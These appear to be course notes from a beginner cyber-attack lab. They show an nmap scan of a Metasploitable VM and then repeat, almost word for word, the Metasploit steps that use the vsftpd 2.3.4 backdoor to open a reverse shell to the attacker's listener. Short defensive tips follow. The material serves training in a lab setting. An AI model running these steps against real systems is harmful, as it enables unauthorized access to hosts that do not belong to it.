- Course Link | [Link](https://www.udemy.com/course/cyber-kill-chain-from-attack-to-defense-in-cybersecurity)

---
- Got 2 VMs : One Kali linux and another metasploit, make sure the network adapter is same for both

```
┌──(root㉿kali)-[~]
└─# nmap -sS 192.168.0.179 -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 07:02 EDT
Nmap scan report for 192.168.0.179
Host is up (0.00071s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:07:EE:86 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```


- nmap -sS 192.168.0.179 -T5, here:

    - sS : SYN scan, also known as half-open scanning, is a popular and stealthy method for identifying open ports on a target system. It works by sending SYN packets to the target ports and analyzing the responses. If a port is open, the target responds with a SYN-ACK packet, indicating that it is ready to establish a connection. If the port is closed, the target responds with a RST (reset) packet. If there is no response, the port is considered filtered or blocked by a firewall.

    - T5 : This option sets the timing template for the scan, with T5 being the fastest and most aggressive setting. It reduces the time between probes and increases the number of concurrent probes, which can speed up the scan significantly. However, it also increases the likelihood of detection by intrusion detection systems (IDS) and firewalls, as well as the risk of overwhelming the target system.

    - O: This option enables OS detection, which attempts to determine the operating system running on the target host based on various characteristics of the responses received during the scan. Nmap uses a database of known OS fingerprints to match against the observed behavior of the target system. This information can be useful for identifying potential vulnerabilities and tailoring further attacks.

    - sV: This option enables version detection, which attempts to determine the version of the services running on the open ports identified during the scan. Nmap sends additional probes to the open ports and analyzes the responses to extract version information. This can help identify specific software versions that may have known vulnerabilities, allowing for more targeted exploitation.

- After finding the open ports, we can use metasploit to exploit the vulnerabilities in the target system. Here are the steps to follow:

1. Start the Metasploit console by typing `msfconsole` in the terminal.
2. Use the `search` command to find an exploit for one of the open ports. For example, to search for an exploit for the FTP service running on port 21, type `search ftp`.
3. Select an exploit by typing `use <exploit_name>`. For example, to use the vsftpd 2.3.4 backdoor exploit, type `use exploit/unix/ftp/vsftpd_234_backdoor`.

4. Set the target IP address by typing `set RHOST <target_ip>`. For example, to set the target IP address to `192.168.0.179`, type `set RHOST 192.168.0.179`.
5. Set the payload by typing `set PAYLOAD <payload_name>`. For example, to use the reverse shell payload, type `set PAYLOAD cmd/unix/reverse`.
6. Set the local IP address and port for the reverse shell by typing `set LHOST <local_ip>` and `set LPORT <local_port>`. For example, to set the local IP address to `192.168.0.100` and the local port to `4444`, type `set LHOST 192.168.0.100` and `set LPORT 4444`.
7. Type `exploit` to launch the exploit. If successful, you should see a message indicating that a session has been opened.
8. Type `sessions` to list the active sessions. You should see a session with a unique ID.
9. Type `sessions -i <session_id>` to interact with the session. For example, to interact with session 1, type `sessions -i 1`.
10. You should now have a command prompt on the target system. You can use various commands to explore the system and gather information.
- To find the vulnerabilities in the target system, we can use various tools such as Nmap, OpenVAS, and Nessus. Here are the steps to follow:

1. Use Nmap to perform a more detailed scan of the target system by typing `nmap -sV -O <target_ip>`. This will provide information about the services running on the open ports and the operating system of the target system.
2. Use OpenVAS to perform a vulnerability scan of the target system. OpenVAS is an open-source vulnerability scanner that can identify known vulnerabilities in the target system. To use OpenVAS, you need to install it on your Kali Linux machine and configure it to scan the target system.
3. Use Nessus to perform a vulnerability scan of the target system. Nessus is a commercial vulnerability scanner that can identify known vulnerabilities in the target system. To use Nessus, you need to install it on your Kali Linux machine and configure it to scan the target system.
- After finding the vulnerabilities, we can use Metasploit to exploit them. Here are the steps to follow:
1. Start the Metasploit console by typing `msfconsole` in the terminal.
2. Use the `search` command to find an exploit for one of the vulnerabilities. For example, to search for an exploit for the vsftpd 2.3.4 vulnerability, type `search vsftpd`.
3. Select an exploit by typing `use <exploit_name>`. For example, to use the vsftpd 2.3.4 backdoor exploit, type `use exploit/unix/ftp/vsftpd_234_backdoor`.
4. Set the target IP address by typing `set RHOST <target_ip>`. For example, to set the target IP address to `192.168.0.179`, type `set RHOST 192.168.0.179`.
5. Set the payload by typing `set PAYLOAD <payload_name>`. For example, to use the reverse shell payload, type `set PAYLOAD cmd/unix/reverse`.
6. Set the local IP address and port for the reverse shell by typing `set LHOST <local_ip>` and `set LPORT <local_port>`. For example, to set the local IP address to `192.168.0.100` and the local port to `4444`, type `set LHOST 192.168.0.100` and `set LPORT 4444`.
7. Type `exploit` to launch the exploit. If successful, you should see a message indicating that a session has been opened.
8. Type `sessions` to list the active sessions. You should see a session with a unique ID.
9. Type `sessions -i <session_id>` to interact with the session. For example, to interact with session 1, type `sessions -i 1`.
10. You should now have a command prompt on the target system. You can use various commands to explore the system and gather information.
- To defend against cyber attacks, we can use various techniques such as firewalls, intrusion detection systems (IDS), and intrusion prevention systems (IPS). Here are the steps to follow:
1. Use a firewall to block unauthorized access to the network. A firewall can be configured to allow only specific types of traffic and block all other traffic.
2. Use an IDS to monitor network traffic for suspicious activity. An IDS can be configured to alert the administrator when it detects a potential attack.
3. Use an IPS to block suspicious activity in real-time. An IPS can be configured to automatically block traffic that matches specific patterns or signatures.
- Make sure to keep the systems and software up to date with the latest security patches. This can help to prevent known vulnerabilities from being exploited.
- Use strong passwords and multi-factor authentication to protect user accounts. This can help to prevent unauthorized access to the system.
- Regularly back up important data to prevent data loss in the event of a cyber attack. This can help to ensure that critical information is not lost in the event of a ransomware attack or other type of cyber attack.

- Look for Resources folder for more

- Certificate [Link](Introduction%20In%20Cyber%20Attack%20For%20Beginners.pdf)